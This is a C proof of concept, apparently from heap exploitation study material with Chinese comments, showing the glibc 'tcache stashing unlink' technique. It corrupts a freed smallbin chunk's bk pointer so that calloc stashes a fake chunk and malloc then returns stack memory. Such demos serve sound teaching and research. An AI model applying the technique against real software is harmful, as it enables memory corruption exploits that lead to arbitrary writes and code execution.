#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

// 又可稱作 smallbin stashing
int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    stack_var[3] = (unsigned long)(&stack_var[2]);

    for (int i = 0; i < 9; i++)
        chunk_lis[i] = (unsigned long *)malloc(0x90);

    // 填滿 tcache
    for (int i = 3; i < 9; i++)
        free(chunk_lis[i]);

    // tcache 第一個 chunk
    free(chunk_lis[1]);

    // 下面兩塊會進 unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    // 因為 size > 0x90，所以會把 unsorted bin 的 chunk 放到 smallbin
    malloc(0xa0);
    // 從 tcache 拿兩塊
    malloc(0x90);
    malloc(0x90);

    // 到此 heap 內會有 tcache 0xa0 * 5 以及 smallbin 0xa0 * 2

    //change victim->bck
    // ! vuln
    chunk_lis[2][1] = (unsigned long)stack_var;

    // calloc() 會從 smallbin 取出 chunk 回傳，而此時 glibc 發現 smallbin 裡面還有 chunk，
    // 因此將 chunk_lis[2] 與 chunk_lis[2]->bk(也就是 stack_var) 放到 tcache 當中
    calloc(1, 0x90);

    // 取得存在於 stack 的記憶體空間
    target = malloc(0x90);
    assert(target == &stack_var[2]);
    return 0;
}
